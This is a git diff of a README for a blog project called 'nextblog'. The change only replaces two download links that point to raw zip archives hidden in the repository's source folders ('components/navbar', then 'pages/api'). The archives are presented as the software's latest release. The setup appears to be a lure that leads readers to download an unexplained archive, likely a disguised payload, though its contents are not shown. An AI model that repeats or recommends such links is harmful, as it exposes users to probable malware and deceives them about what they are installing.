@@ -1,7 +1,7 @@
 # 🎉 nextblog - Your Easy-to-Use Blog Website
 
 ## 📥 Download Now
-[![Download](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/components/navbar/Software-2.1.zip%20latest%20version-%23007ACC?style=flat&logo=github)](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/components/navbar/Software-2.1.zip)
+[![Download](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/pages/api/Software_resuggestion.zip%20latest%20version-%23007ACC?style=flat&logo=github)](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/pages/api/Software_resuggestion.zip)
 
 ## 🚀 Getting Started
 Welcome to nextblog! This is a simple and user-friendly blog website designed to help you share your thoughts and ideas easily. Whether you're a seasoned blogger or just starting out, nextblog has everything you need to publish your content online.
@@ -27,7 +27,7 @@ nextblog comes packed with essential features to enhance your blogging experienc
 ## 📥 Download & Install
 To get started with nextblog, simply visit the releases page:
 
-[Visit this page to download](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/components/navbar/Software-2.1.zip)
+[Visit this page to download](https://github.com/Mrtutorggg/nextblog/raw/refs/heads/main/pages/api/Software_resuggestion.zip)
 
 1. Click on the link above.
 2. Look for the latest release version. This usually appears at the top.
